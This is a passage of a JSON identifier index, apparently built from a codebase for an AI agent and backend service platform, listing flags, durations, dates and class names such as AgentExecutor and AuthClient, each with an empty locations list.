        },
        "--validators": {
          "value": "--validators",
          "category": "identifiers",
          "locations": []
        },
        "--value": {
          "value": "--value",
          "category": "identifiers",
          "locations": []
        },
        "--verbose": {
          "value": "--verbose",
          "category": "identifiers",
          "locations": []
        },
        "--verify": {
          "value": "--verify",
          "category": "identifiers",
          "locations": []
        },
        "--version": {
          "value": "--version",
          "category": "identifiers",
          "locations": []
        },
        "--violation-limit": {
          "value": "--violation-limit",
          "category": "identifiers",
          "locations": []
        },
        "--wait-for-completion": {
          "value": "--wait-for-completion",
          "category": "identifiers",
          "locations": []
        },
        "--watch-boundaries": {
          "value": "--watch-boundaries",
          "category": "identifiers",
          "locations": []
        },
        "--workflow": {
          "value": "--workflow",
          "category": "identifiers",
          "locations": []
        },
        "--workflow-id": {
          "value": "--workflow-id",
          "category": "identifiers",
          "locations": []
        },
        "--workflow-name": {
          "value": "--workflow-name",
          "category": "identifiers",
          "locations": []
        },
        "-01": {
          "value": "-01",
          "category": "identifiers",
          "locations": []
        },
        "-10": {
          "value": "-10",
          "category": "identifiers",
          "locations": []
        },
        "-auto-approve": {
          "value": "-auto-approve",
          "category": "identifiers",
          "locations": []
        },
        "-exec": {
          "value": "-exec",
          "category": "identifiers",
          "locations": []
        },
        "-inf": {
          "value": "-inf",
          "category": "identifiers",
          "locations": []
        },
        "-name": {
          "value": "-name",
          "category": "identifiers",
          "locations": []
        },
        "-p1": {
          "value": "-p1",
          "category": "identifiers",
          "locations": []
        },
        "-path": {
          "value": "-path",
          "category": "identifiers",
          "locations": []
        },
        "-rf": {
          "value": "-rf",
          "category": "identifiers",
          "locations": []
        },
        "-staging": {
          "value": "-staging",
          "category": "identifiers",
          "locations": []
        },
        "-type": {
          "value": "-type",
          "category": "identifiers",
          "locations": []
        },
        "-xvs": {
          "value": "-xvs",
          "category": "identifiers",
          "locations": []
        },
        "/run_agent": {
          "value": "/run_agent",
          "category": "identifiers",
          "locations": []
        },
        "00-": {
          "value": "00-",
          "category": "identifiers",
          "locations": []
        },
        "02d": {
          "value": "02d",
          "category": "identifiers",
          "locations": []
        },
        "06d": {
          "value": "06d",
          "category": "identifiers",
          "locations": []
        },
        "0ms": {
          "value": "0ms",
          "category": "identifiers",
          "locations": []
        },
        "1000ms": {
          "value": "1000ms",
          "category": "identifiers",
          "locations": []
        },
        "1200ms": {
          "value": "1200ms",
          "category": "identifiers",
          "locations": []
        },
        "12h": {
          "value": "12h",
          "category": "identifiers",
          "locations": []
        },
        "1450ms": {
          "value": "1450ms",
          "category": "identifiers",
          "locations": []
        },
        "1Gi": {
          "value": "1Gi",
          "category": "identifiers",
          "locations": []
        },
        "2022-11-28": {
          "value": "2022-11-28",
          "category": "identifiers",
          "locations": []
        },
        "2024-01-01": {
          "value": "2024-01-01",
          "category": "identifiers",
          "locations": []
        },
        "2024-01-02": {
          "value": "2024-01-02",
          "category": "identifiers",
          "locations": []
        },
        "2024-01-03": {
          "value": "2024-01-03",
          "category": "identifiers",
          "locations": []
        },
        "2025-01-22": {
          "value": "2025-01-22",
          "category": "identifiers",
          "locations": []
        },
        "2025-08-10": {
          "value": "2025-08-10",
          "category": "identifiers",
          "locations": []
        },
        "2025-08-11": {
          "value": "2025-08-11",
          "category": "identifiers",
          "locations": []
        },
        "2025-08-13": {
          "value": "2025-08-13",
          "category": "identifiers",
          "locations": []
        },
        "2025-08-16": {
          "value": "2025-08-16",
          "category": "identifiers",
          "locations": []
        },
        "2025-12-31": {
          "value": "2025-12-31",
          "category": "identifiers",
          "locations": []
        },
        "2100ms": {
          "value": "2100ms",
          "category": "identifiers",
          "locations": []
        },
        "24h": {
          "value": "24h",
          "category": "identifiers",
          "locations": []
        },
        "2800ms": {
          "value": "2800ms",
          "category": "identifiers",
          "locations": []
        },
        "29d08736f8b7": {
          "value": "29d08736f8b7",
          "category": "identifiers",
          "locations": []
        },
        "300_line_rule": {
          "value": "300_line_rule",
          "category": "identifiers",
          "locations": []
        },
        "30d": {
          "value": "30d",
          "category": "identifiers",
          "locations": []
        },
        "30s": {
          "value": "30s",
          "category": "identifiers",
          "locations": []
        },
        "400ms": {
          "value": "400ms",
          "category": "identifiers",
          "locations": []
        },
        "420ms": {
          "value": "420ms",
          "category": "identifiers",
          "locations": []
        },
        "45m": {
          "value": "45m",
          "category": "identifiers",
          "locations": []
        },
        "512Mi": {
          "value": "512Mi",
          "category": "identifiers",
          "locations": []
        },
        "512m": {
          "value": "512m",
          "category": "identifiers",
          "locations": []
        },
        "66e0e5d9662d": {
          "value": "66e0e5d9662d",
          "category": "identifiers",
          "locations": []
        },
        "680ms": {
          "value": "680ms",
          "category": "identifiers",
          "locations": []
        },
        "850ms": {
          "value": "850ms",
          "category": "identifiers",
          "locations": []
        },
        "8_line_rule": {
          "value": "8_line_rule",
          "category": "identifiers",
          "locations": []
        },
        "90d": {
          "value": "90d",
          "category": "identifiers",
          "locations": []
        },
        "9f682854941c": {
          "value": "9f682854941c",
          "category": "identifiers",
          "locations": []
        },
        "AES-256": {
          "value": "AES-256",
          "category": "identifiers",
          "locations": []
        },
        "AIOperationsMap": {
          "value": "AIOperationsMap",
          "category": "identifiers",
          "locations": []
        },
        "AIOperationsMapFormatter": {
          "value": "AIOperationsMapFormatter",
          "category": "identifiers",
          "locations": []
        },
        "AIPatternDetector": {
          "value": "AIPatternDetector",
          "category": "identifiers",
          "locations": []
        },
        "AIProvider": {
          "value": "AIProvider",
          "category": "identifiers",
          "locations": []
        },
        "AISupplyItem": {
          "value": "AISupplyItem",
          "category": "identifiers",
          "locations": []
        },
        "APIContractValidator": {
          "value": "APIContractValidator",
          "category": "identifiers",
          "locations": []
        },
        "Accept": {
          "value": "Accept",
          "category": "identifiers",
          "locations": []
        },
        "Access": {
          "value": "Access",
          "category": "identifiers",
          "locations": []
        },
        "Access-Control-Allow-Credentials": {
          "value": "Access-Control-Allow-Credentials",
          "category": "identifiers",
          "locations": []
        },
        "Access-Control-Allow-Headers": {
          "value": "Access-Control-Allow-Headers",
          "category": "identifiers",
          "locations": []
        },
        "Access-Control-Allow-Methods": {
          "value": "Access-Control-Allow-Methods",
          "category": "identifiers",
          "locations": []
        },
        "Access-Control-Allow-Origin": {
          "value": "Access-Control-Allow-Origin",
          "category": "identifiers",
          "locations": []
        },
        "Access-Control-Expose-Headers": {
          "value": "Access-Control-Expose-Headers",
          "category": "identifiers",
          "locations": []
        },
        "Access-Control-Max-Age": {
          "value": "Access-Control-Max-Age",
          "category": "identifiers",
          "locations": []
        },
        "Access-Control-Request-Headers": {
          "value": "Access-Control-Request-Headers",
          "category": "identifiers",
          "locations": []
        },
        "Access-Control-Request-Method": {
          "value": "Access-Control-Request-Method",
          "category": "identifiers",
          "locations": []
        },
        "AccessController": {
          "value": "AccessController",
          "category": "identifiers",
          "locations": []
        },
        "Achieve": {
          "value": "Achieve",
          "category": "identifiers",
          "locations": []
        },
        "Achieved": {
          "value": "Achieved",
          "category": "identifiers",
          "locations": []
        },
        "Action": {
          "value": "Action",
          "category": "identifiers",
          "locations": []
        },
        "ActionsToMeetGoalsSubAgent": {
          "value": "ActionsToMeetGoalsSubAgent",
          "category": "identifiers",
          "locations": []
        },
        "ActiveUserDep": {
          "value": "ActiveUserDep",
          "category": "identifiers",
          "locations": []
        },
        "ActiveUserWsDep": {
          "value": "ActiveUserWsDep",
          "category": "identifiers",
          "locations": []
        },
        "AdaptiveRateLimitConfig": {
          "value": "AdaptiveRateLimitConfig",
          "category": "identifiers",
          "locations": []
        },
        "AdaptiveRetryStrategy": {
          "value": "AdaptiveRetryStrategy",
          "category": "identifiers",
          "locations": []
        },
        "Added": {
          "value": "Added",
          "category": "identifiers",
          "locations": []
        },
        "Address": {
          "value": "Address",
          "category": "identifiers",
          "locations": []
        },
        "AdminDep": {
          "value": "AdminDep",
          "category": "identifiers",
          "locations": []
        },
        "AdminToolAuditLog": {
          "value": "AdminToolAuditLog",
          "category": "identifiers",
          "locations": []
        },
        "AdminToolDispatcher": {
          "value": "AdminToolDispatcher",
          "category": "identifiers",
          "locations": []
        },
        "AdminToolExecutionEngine": {
          "value": "AdminToolExecutionEngine",
          "category": "identifiers",
          "locations": []
        },
        "AdminToolInfo": {
          "value": "AdminToolInfo",
          "category": "identifiers",
          "locations": []
        },
        "AdminToolMetrics": {
          "value": "AdminToolMetrics",
          "category": "identifiers",
          "locations": []
        },
        "AdminToolType": {
          "value": "AdminToolType",
          "category": "identifiers",
          "locations": []
        },
        "Advanced": {
          "value": "Advanced",
          "category": "identifiers",
          "locations": []
        },
        "AdvancedGenerators": {
          "value": "AdvancedGenerators",
          "category": "identifiers",
          "locations": []
        },
        "AdvancedOptimizationForCoreFunction": {
          "value": "AdvancedOptimizationForCoreFunction",
          "category": "identifiers",
          "locations": []
        },
        "Agent": {
          "value": "Agent",
          "category": "identifiers",
          "locations": []
        },
        "AgentCacheConfig": {
          "value": "AgentCacheConfig",
          "category": "identifiers",
          "locations": []
        },
        "AgentCompleted": {
          "value": "AgentCompleted",
          "category": "identifiers",
          "locations": []
        },
        "AgentCompletedMessage": {
          "value": "AgentCompletedMessage",
          "category": "identifiers",
          "locations": []
        },
        "AgentCompletedPayload": {
          "value": "AgentCompletedPayload",
          "category": "identifiers",
          "locations": []
        },
        "AgentConfig": {
          "value": "AgentConfig",
          "category": "identifiers",
          "locations": []
        },
        "AgentConfigurationError": {
          "value": "AgentConfigurationError",
          "category": "identifiers",
          "locations": []
        },
        "AgentCoordinationError": {
          "value": "AgentCoordinationError",
          "category": "identifiers",
          "locations": []
        },
        "AgentError": {
          "value": "AgentError",
          "category": "identifiers",
          "locations": []
        },
        "AgentErrorHandler": {
          "value": "AgentErrorHandler",
          "category": "identifiers",
          "locations": []
        },
        "AgentErrorMessage": {
          "value": "AgentErrorMessage",
          "category": "identifiers",
          "locations": []
        },
        "AgentErrorPayload": {
          "value": "AgentErrorPayload",
          "category": "identifiers",
          "locations": []
        },
        "AgentExecutionContext": {
          "value": "AgentExecutionContext",
          "category": "identifiers",
          "locations": []
        },
        "AgentExecutionError": {
          "value": "AgentExecutionError",
          "category": "identifiers",
          "locations": []
        },
        "AgentExecutionMetrics": {
          "value": "AgentExecutionMetrics",
          "category": "identifiers",
          "locations": []
        },
        "AgentExecutionResult": {
          "value": "AgentExecutionResult",
          "category": "identifiers",
          "locations": []
        },
        "AgentExecutor": {
          "value": "AgentExecutor",
          "category": "identifiers",
          "locations": []
        },
        "AgentLog": {
          "value": "AgentLog",
          "category": "identifiers",
          "locations": []
        },
        "AgentLogMessage": {
          "value": "AgentLogMessage",
          "category": "identifiers",
          "locations": []
        },
        "AgentMessage": {
          "value": "AgentMessage",
          "category": "identifiers",
          "locations": []
        },
        "AgentMetadata": {
          "value": "AgentMetadata",
          "category": "identifiers",
          "locations": []
        },
        "AgentMetricType": {
          "value": "AgentMetricType",
          "category": "identifiers",
          "locations": []
        },
        "AgentMetrics": {
          "value": "AgentMetrics",
          "category": "identifiers",
          "locations": []
        },
        "AgentMetricsCollector": {
          "value": "AgentMetricsCollector",
          "category": "identifiers",
          "locations": []
        },
        "AgentOperationRecord": {
          "value": "AgentOperationRecord",
          "category": "identifiers",
          "locations": []
        },
        "AgentPhase": {
          "value": "AgentPhase",
          "category": "identifiers",
          "locations": []
        },
        "AgentQualityProfile": {
          "value": "AgentQualityProfile",
          "category": "identifiers",
          "locations": []
        },
        "AgentRecoveryConfig": {
          "value": "AgentRecoveryConfig",
          "category": "identifiers",
          "locations": []
        },
        "AgentRecoveryRegistry": {
          "value": "AgentRecoveryRegistry",
          "category": "identifiers",
          "locations": []
        },
        "AgentRegistry": {
          "value": "AgentRegistry",
          "category": "identifiers",
          "locations": []
        },
        "AgentRepository": {
          "value": "AgentRepository",
          "category": "identifiers",
          "locations": []
        },
        "AgentResponse": {
          "value": "AgentResponse",
          "category": "identifiers",
          "locations": []
        },
        "AgentResponseData": {
          "value": "AgentResponseData",
          "category": "identifiers",
          "locations": []
        },
        "AgentResponseProcessor": {
          "value": "AgentResponseProcessor",
          "category": "identifiers",
          "locations": []
        },
        "AgentResult": {
          "value": "AgentResult",
          "category": "identifiers",
          "locations": []
        },
        "AgentService": {
          "value": "AgentService",
          "category": "identifiers",
          "locations": []
        },
        "AgentStarted": {
          "value": "AgentStarted",
          "category": "identifiers",
          "locations": []
        },
        "AgentStartedMessage": {
          "value": "AgentStartedMessage",
          "category": "identifiers",
          "locations": []
        },
        "AgentStartedPayload": {
          "value": "AgentStartedPayload",
          "category": "identifiers",
          "locations": []
        },
        "AgentState": {
          "value": "AgentState",
          "category": "identifiers",
          "locations": []
        },
        "AgentStateMetadata": {
          "value": "AgentStateMetadata",
          "category": "identifiers",
          "locations": []
        },
        "AgentStateProtocol": {
          "value": "AgentStateProtocol",
          "category": "identifiers",
          "locations": []
        },
        "AgentStateRepository": {
          "value": "AgentStateRepository",
          "category": "identifiers",
          "locations": []
        },
        "AgentStateSnapshot": {
          "value": "AgentStateSnapshot",
          "category": "identifiers",
          "locations": []
        },
        "AgentStatus": {
          "value": "AgentStatus",
          "category": "identifiers",
          "locations": []
        },
        "AgentStoppedMessage": {
          "value": "AgentStoppedMessage",
          "category": "identifiers",
          "locations": []
        },
        "AgentStoppedPayload": {
          "value": "AgentStoppedPayload",
          "category": "identifiers",
          "locations": []
        },
        "AgentSystemAnalyzer": {
          "value": "AgentSystemAnalyzer",
          "category": "identifiers",
          "locations": []
        },
        "AgentThinkingMessage": {
          "value": "AgentThinkingMessage",
          "category": "identifiers",
          "locations": []
        },
        "AgentTimeoutError": {
          "value": "AgentTimeoutError",
          "category": "identifiers",
          "locations": []
        },
        "AgentTool": {
          "value": "AgentTool",
          "category": "identifiers",
          "locations": []
        },
        "AgentTools": {
          "value": "AgentTools",
          "category": "identifiers",
          "locations": []
        },
        "AgentTurn-": {
          "value": "AgentTurn-",
          "category": "identifiers",
          "locations": []
        },
        "AgentType": {
          "value": "AgentType",
          "category": "identifiers",
          "locations": []
        },
        "AgentTypeRegistry": {
          "value": "AgentTypeRegistry",
          "category": "identifiers",
          "locations": []
        },
        "AgentUpdate": {
          "value": "AgentUpdate",
          "category": "identifiers",
          "locations": []
        },
        "AgentUpdateMessage": {
          "value": "AgentUpdateMessage",
          "category": "identifiers",
          "locations": []
        },
        "AgentUpdatePayload": {
          "value": "AgentUpdatePayload",
          "category": "identifiers",
          "locations": []
        },
        "AgentValidationError": {
          "value": "AgentValidationError",
          "category": "identifiers",
          "locations": []
        },
        "AggregationLevel": {
          "value": "AggregationLevel",
          "category": "identifiers",
          "locations": []
        },
        "Alert": {
          "value": "Alert",
          "category": "identifiers",
          "locations": []
        },
        "AlertAcknowledgement": {
          "value": "AlertAcknowledgement",
          "category": "identifiers",
          "locations": []
        },
        "AlertAcknowledgementResponse": {
          "value": "AlertAcknowledgementResponse",
          "category": "identifiers",
          "locations": []
        },
        "AlertEngine": {
          "value": "AlertEngine",
          "category": "identifiers",
          "locations": []
        },
        "AlertEvaluator": {
          "value": "AlertEvaluator",
          "category": "identifiers",
          "locations": []
        },
        "AlertEvent": {
          "value": "AlertEvent",
          "category": "identifiers",
          "locations": []
        },
        "AlertLevel": {
          "value": "AlertLevel",
          "category": "identifiers",
          "locations": []
        },
        "AlertManager": {
          "value": "AlertManager",
          "category": "identifiers",
          "locations": []
        },
        "AlertManagerProtocol": {
          "value": "AlertManagerProtocol",
          "category": "identifiers",
          "locations": []
        },
        "AlertRule": {
          "value": "AlertRule",
          "category": "identifiers",
          "locations": []
        },
        "AlertSeverity": {
          "value": "AlertSeverity",
          "category": "identifiers",
          "locations": []
        },
        "AlertThreshold": {
          "value": "AlertThreshold",
          "category": "identifiers",
          "locations": []
        },
        "AlertThresholds": {
          "value": "AlertThresholds",
          "category": "identifiers",
          "locations": []
        },
        "Alice": {
          "value": "Alice",
          "category": "identifiers",
          "locations": []
        },
        "All": {
          "value": "All",
          "category": "identifiers",
          "locations": []
        },
        "Allowed": {
          "value": "Allowed",
          "category": "identifiers",
          "locations": []
        },
        "AlternativeServiceFallback": {
          "value": "AlternativeServiceFallback",
          "category": "identifiers",
          "locations": []
        },
        "Analysis": {
          "value": "Analysis",
          "category": "identifiers",
          "locations": []
        },
        "AnalysisEngine": {
          "value": "AnalysisEngine",
          "category": "identifiers",
          "locations": []
        },
        "AnalysisMetrics": {
          "value": "AnalysisMetrics",
          "category": "identifiers",
          "locations": []
        },
        "AnalysisRequest": {
          "value": "AnalysisRequest",
          "category": "identifiers",
          "locations": []
        },
        "AnalysisResponse": {
          "value": "AnalysisResponse",
          "category": "identifiers",
          "locations": []
        },
        "AnalysisResult": {
          "value": "AnalysisResult",
          "category": "identifiers",
          "locations": []
        },
        "AnalysisStatus": {
          "value": "AnalysisStatus",
          "category": "identifiers",
          "locations": []
        },
        "AnalystAgent": {
          "value": "AnalystAgent",
          "category": "identifiers",
          "locations": []
        },
        "Analytics": {
          "value": "Analytics",
          "category": "identifiers",
          "locations": []
        },
        "AnalyticsCollector": {
          "value": "AnalyticsCollector",
          "category": "identifiers",
          "locations": []
        },
        "AnalyticsReporter": {
          "value": "AnalyticsReporter",
          "category": "identifiers",
          "locations": []
        },
        "AnalyticsTracker": {
          "value": "AnalyticsTracker",
          "category": "identifiers",
          "locations": []
        },
        "Analyzed": {
          "value": "Analyzed",
          "category": "identifiers",
          "locations": []
        },
        "Analyzing": {
          "value": "Analyzing",
          "category": "identifiers",
          "locations": []
        },
        "AnomalyDetail": {
          "value": "AnomalyDetail",
          "category": "identifiers",
          "locations": []
        },
        "AnomalyDetectionResponse": {
          "value": "AnomalyDetectionResponse",
          "category": "identifiers",
          "locations": []
        },
        "AnomalyDetector": {
          "value": "AnomalyDetector",
          "category": "identifiers",
          "locations": []
        },
        "AnomalySeverity": {
          "value": "AnomalySeverity",
          "category": "identifiers",
          "locations": []
        },
        "Anthropic": {
          "value": "Anthropic",
          "category": "identifiers",
          "locations": []
        },
        "Any": {
          "value": "Any",
          "category": "identifiers",
          "locations": []
        },
        "ApexOptimizerAgentRun": {
          "value": "ApexOptimizerAgentRun",
          "category": "identifiers",
          "locations": []
        },
        "ApexOptimizerAgentRunReport": {
          "value": "ApexOptimizerAgentRunReport",
          "category": "identifiers",
          "locations": []
        },
        "ApiCacheManager": {
          "value": "ApiCacheManager",
          "category": "identifiers",
          "locations": []
        },
        "ApiCallResult": {
          "value": "ApiCallResult",
          "category": "identifiers",
          "locations": []
        },
        "ApiCircuitBreaker": {
          "value": "ApiCircuitBreaker",
          "category": "identifiers",
          "locations": []
        },
        "ApiErrorHandler": {
          "value": "ApiErrorHandler",
          "category": "identifiers",
          "locations": []
        },
        "ApiGatewayRateLimiter": {
          "value": "ApiGatewayRateLimiter",
          "category": "identifiers",
          "locations": []
        },
        "ApiGatewayRouter": {
          "value": "ApiGatewayRouter",
          "category": "identifiers",
          "locations": []
        },
        "ApiKey": {
          "value": "ApiKey",
          "category": "identifiers",
          "locations": []
        },
        "ApiResponse": {
          "value": "ApiResponse",
          "category": "identifiers",
          "locations": []
        },
        "ApiRetryStrategy": {
          "value": "ApiRetryStrategy",
          "category": "identifiers",
          "locations": []
        },
        "AppConfig": {
          "value": "AppConfig",
          "category": "identifiers",
          "locations": []
        },
        "ApprovalRequirements": {
          "value": "ApprovalRequirements",
          "category": "identifiers",
          "locations": []
        },
        "ApprovalWorkflow": {
          "value": "ApprovalWorkflow",
          "category": "identifiers",
          "locations": []
        },
        "ArchitectureEnforcer": {
          "value": "ArchitectureEnforcer",
          "category": "identifiers",
          "locations": []
        },
        "ArchiverGenerator": {
          "value": "ArchiverGenerator",
          "category": "identifiers",
          "locations": []
        },
        "Array": {
          "value": "Array",
          "category": "identifiers",
          "locations": []
        },
        "AssertionError": {
          "value": "AssertionError",
          "category": "identifiers",
          "locations": []
        },
        "AssertionHelpers": {
          "value": "AssertionHelpers",
          "category": "identifiers",
          "locations": []
        },
        "Assistant": {
          "value": "Assistant",
          "category": "identifiers",
          "locations": []
        },
        "AsyncAdaptedQueuePool": {
          "value": "AsyncAdaptedQueuePool",
          "category": "identifiers",
          "locations": []
        },
        "AsyncBatchProcessor": {
          "value": "AsyncBatchProcessor",
          "category": "identifiers",
          "locations": []
        },
        "AsyncCircuitBreaker": {
          "value": "AsyncCircuitBreaker",
          "category": "identifiers",
          "locations": []
        },
        "AsyncConnectionPool": {
          "value": "AsyncConnectionPool",
          "category": "identifiers",
          "locations": []
        },
        "AsyncLock": {
          "value": "AsyncLock",
          "category": "identifiers",
          "locations": []
        },
        "AsyncRateLimiter": {
          "value": "AsyncRateLimiter",
          "category": "identifiers",
          "locations": []
        },
        "AsyncResourceManager": {
          "value": "AsyncResourceManager",
          "category": "identifiers",
          "locations": []
        },
        "AsyncServiceInterface": {
          "value": "AsyncServiceInterface",
          "category": "identifiers",
          "locations": []
        },
        "AsyncSessionLocal": {
          "value": "AsyncSessionLocal",
          "category": "identifiers",
          "locations": []
        },
        "AsyncTaskPool": {
          "value": "AsyncTaskPool",
          "category": "identifiers",
          "locations": []
        },
        "AsyncTaskService": {
          "value": "AsyncTaskService",
          "category": "identifiers",
          "locations": []
        },
        "AsyncTestBase": {
          "value": "AsyncTestBase",
          "category": "identifiers",
          "locations": []
        },
        "Attempt": {
          "value": "Attempt",
          "category": "identifiers",
          "locations": []
        },
        "AttributeError": {
          "value": "AttributeError",
          "category": "identifiers",
          "locations": []
        },
        "Audit": {
          "value": "Audit",
          "category": "identifiers",
          "locations": []
        },
        "AuditContext": {
          "value": "AuditContext",
          "category": "identifiers",
          "locations": []
        },
        "AuditEvent": {
          "value": "AuditEvent",
          "category": "identifiers",
          "locations": []
        },
        "AuditLog": {
          "value": "AuditLog",
          "category": "identifiers",
          "locations": []
        },
        "AuditLogFactory": {
          "value": "AuditLogFactory",
          "category": "identifiers",
          "locations": []
        },
        "AuditLoggerProtocol": {
          "value": "AuditLoggerProtocol",
          "category": "identifiers",
          "locations": []
        },
        "AuditTimer": {
          "value": "AuditTimer",
          "category": "identifiers",
          "locations": []
        },
        "AuditTrailValidator": {
          "value": "AuditTrailValidator",
          "category": "identifiers",
          "locations": []
        },
        "Auditor": {
          "value": "Auditor",
          "category": "identifiers",
          "locations": []
        },
        "AuthAuditLog": {
          "value": "AuthAuditLog",
          "category": "identifiers",
          "locations": []
        },
        "AuthAuditRepository": {
          "value": "AuthAuditRepository",
          "category": "identifiers",
          "locations": []
        },
        "AuthCircuitBreakerManager": {
          "value": "AuthCircuitBreakerManager",
          "category": "identifiers",
          "locations": []
        },
        "AuthClient": {
          "value": "AuthClient",
          "category": "identifiers",
          "locations": []
        },
        "AuthClientProtocol": {
          "value": "AuthClientProtocol",
          "category": "identifiers",
          "locations": []
        },
        "AuthConfig": {
          "value": "AuthConfig",
          "category": "identifiers",
          "locations": []
        },
        "AuthConfigResponse": {
          "value": "AuthConfigResponse",
          "category": "identifiers",
          "locations": []
        },
        "AuthConstants": {
          "value": "AuthConstants",
          "category": "identifiers",
          "locations": []
        },
        "AuthDependencies": {
          "value": "AuthDependencies",
          "category": "identifiers",
          "locations": []
        },
        "AuthEndpoints": {
          "value": "AuthEndpoints",
          "category": "identifiers",
          "locations": []
        },
        "AuthError": {
          "value": "AuthError",
          "category": "identifiers",
          "locations": []
        },
        "AuthErrorConstants": {
          "value": "AuthErrorConstants",
          "category": "identifiers",
          "locations": []
        },
        "AuthErrorResponse": {
          "value": "AuthErrorResponse",
          "category": "identifiers",
          "locations": []
        },
        "AuthProvider": {
          "value": "AuthProvider",
          "category": "identifiers",
          "locations": []
        },
        "AuthRequest": {
          "value": "AuthRequest",
          "category": "identifiers",
          "locations": []
        },
        "AuthResponse": {
          "value": "AuthResponse",
          "category": "identifiers",
          "locations": []
        },
        "AuthServiceClient": {
          "value": "AuthServiceClient",
          "category": "identifiers",
          "locations": []
        },
        "AuthServiceProtocol": {
          "value": "AuthServiceProtocol",
          "category": "identifiers",
          "locations": []
        },
        "AuthServiceSettings": {
          "value": "AuthServiceSettings",
          "category": "identifiers",
          "locations": []
        },
        "AuthSession": {
          "value": "AuthSession",
          "category": "identifiers",
          "locations": []
        },
        "AuthSessionFactory": {
          "value": "AuthSessionFactory",
          "category": "identifiers",
          "locations": []
        },
        "AuthSessionRepository": {
          "value": "AuthSessionRepository",
          "category": "identifiers",
          "locations": []
        },
        "AuthTestBase": {
          "value": "AuthTestBase",
          "category": "identifiers",
          "locations": []
        },
        "AuthTestClient": {
          "value": "AuthTestClient",
          "category": "identifiers",
          "locations": []
        },
        "AuthTestEnvironment": {
          "value": "AuthTestEnvironment",
          "category": "identifiers",
          "locations": []
        },
        "AuthTestMixin": {
          "value": "AuthTestMixin",
          "category": "identifiers",
          "locations": []
        },
        "AuthTestUtils": {
          "value": "AuthTestUtils",
          "category": "identifiers",
          "locations": []
        },
        "AuthTokenCache": {
          "value": "AuthTokenCache",
          "category": "identifiers",
          "locations": []
        },
        "AuthType": {
          "value": "AuthType",
          "category": "identifiers",
          "locations": []
        },
        "AuthUser": {
          "value": "AuthUser",
          "category": "identifiers",
          "locations": []
        },
        "AuthUserFactory": {
          "value": "AuthUserFactory",
          "category": "identifiers",
          "locations": []
        },
        "AuthUserRepository": {
          "value": "AuthUserRepository",
          "category": "identifiers",
          "locations": []
        },
        "AuthValidationError": {
          "value": "AuthValidationError",
          "category": "identifiers",
          "locations": []
        },
        "Authentication": {
          "value": "Authentication",
          "category": "identifiers",
          "locations": []
        },
        "AuthenticationError": {
          "value": "AuthenticationError",
          "category": "identifiers",
          "locations": []
        },
        "Authorization": {
          "value": "Authorization",
          "category": "identifiers",
          "locations": []
        },
        "AuthorizationError": {
          "value": "AuthorizationError",
          "category": "identifiers",
          "locations": []
        },
        "AuthorizationResult": {
          "value": "AuthorizationResult",
          "category": "identifiers",
          "locations": []
        },
        "Auto-scaling": {
          "value": "Auto-scaling",
          "category": "identifiers",
          "locations": []
        },
        "AutoUpgradeRule": {
          "value": "AutoUpgradeRule",
          "category": "identifiers",
          "locations": []
        },
        "AutonomousTestReviewer": {
          "value": "AutonomousTestReviewer",
          "category": "identifiers",
          "locations": []
        },
        "AvailabilityStatus": {
          "value": "AvailabilityStatus",
          "category": "identifiers",
          "locations": []
        },
        "Available": {
          "value": "Available",
          "category": "identifiers",
          "locations": []
        },
        "Backend": {
          "value": "Backend",
          "category": "identifiers",
          "locations": []
        },
        "BackoffStrategy": {
          "value": "BackoffStrategy",
          "category": "identifiers",
          "locations": []
        },
        "BackpressureService": {
          "value": "BackpressureService",
          "category": "identifiers",
          "locations": []
        },
        "Base": {
          "value": "Base",
          "category": "identifiers",
          "locations": []
        },
        "BaseAgentConfig": {
          "value": "BaseAgentConfig",
          "category": "identifiers",
          "locations": []
        },
        "BaseAgentInterface": {
          "value": "BaseAgentInterface",
          "category": "identifiers",
          "locations": []
        },
        "BaseAgentRecoveryStrategy": {
          "value": "BaseAgentRecoveryStrategy",
          "category": "identifiers",
          "locations": []
        },
        "BaseAlert": {
          "value": "BaseAlert",
          "category": "identifiers",
          "locations": []
        },
        "BaseCompensationHandler": {
          "value": "BaseCompensationHandler",
          "category": "identifiers",
          "locations": []
        },
        "BaseContext": {
          "value": "BaseContext",
          "category": "identifiers",
          "locations": []
        },
        "BaseDomainExpert": {
          "value": "BaseDomainExpert",
          "category": "identifiers",
          "locations": []
        },
        "BaseErrorHandler": {
          "value": "BaseErrorHandler",
          "category": "identifiers",
          "locations": []
        },
        "BaseExecutionEngine": {
          "value": "BaseExecutionEngine",
          "category": "identifiers",
          "locations": []
        },
        "BaseExecutionInterface": {
          "value": "BaseExecutionInterface",
          "category": "identifiers",
          "locations": []
        },
        "BaseHealthChecker": {
          "value": "BaseHealthChecker",
          "category": "identifiers",
          "locations": []
        },
        "BaseMCPAgent": {
          "value": "BaseMCPAgent",
          "category": "identifiers",
          "locations": []
        },
        "BaseRepository": {
          "value": "BaseRepository",
          "category": "identifiers",
          "locations": []
        },
        "BaseService": {
          "value": "BaseService",
          "category": "identifiers",
          "locations": []
        },
        "BaseServiceInterface": {
          "value": "BaseServiceInterface",
          "category": "identifiers",
          "locations": []
        },
        "BaseServiceMixin": {
          "value": "BaseServiceMixin",
          "category": "identifiers",
          "locations": []
        },
        "BaseSubAgent": {
          "value": "BaseSubAgent",
          "category": "identifiers",
          "locations": []
        },
        "BaseTool": {
          "value": "BaseTool",
          "category": "identifiers",
          "locations": []
        },
        "BaseWebSocketMessage": {
          "value": "BaseWebSocketMessage",
          "category": "identifiers",
          "locations": []
        },
        "BaseWebSocketPayload": {
          "value": "BaseWebSocketPayload",
          "category": "identifiers",
          "locations": []
        },
        "BaselineMetrics": {
          "value": "BaselineMetrics",
          "category": "identifiers",
          "locations": []
        },
        "Basic": {
          "value": "Basic",
          "category": "identifiers",
          "locations": []
        },
        "BatchConfig": {
          "value": "BatchConfig",
          "category": "identifiers",
          "locations": []
        },
        "BatchExecutor": {
          "value": "BatchExecutor",
          "category": "identifiers",
          "locations": []
        },
        "BatchLLMRequest": {
          "value": "BatchLLMRequest",
          "category": "identifiers",
          "locations": []
        },
        "BatchLLMResponse": {
          "value": "BatchLLMResponse",
          "category": "identifiers",
          "locations": []
        },
        "BatchMetrics": {
          "value": "BatchMetrics",
          "category": "identifiers",
          "locations": []
        },
        "BatchOperationResult": {
          "value": "BatchOperationResult",
          "category": "identifiers",
          "locations": []
        },
        "BatchProcessor": {
          "value": "BatchProcessor",
          "category": "identifiers",
          "locations": []
        },
        "BatchStrategy": {
          "value": "BatchStrategy",
          "category": "identifiers",
          "locations": []
        },
        "BatchedBroadcastManager": {
          "value": "BatchedBroadcastManager",
          "category": "identifiers",
          "locations": []
        },
        "BatchedMessage": {
          "value": "BatchedMessage",
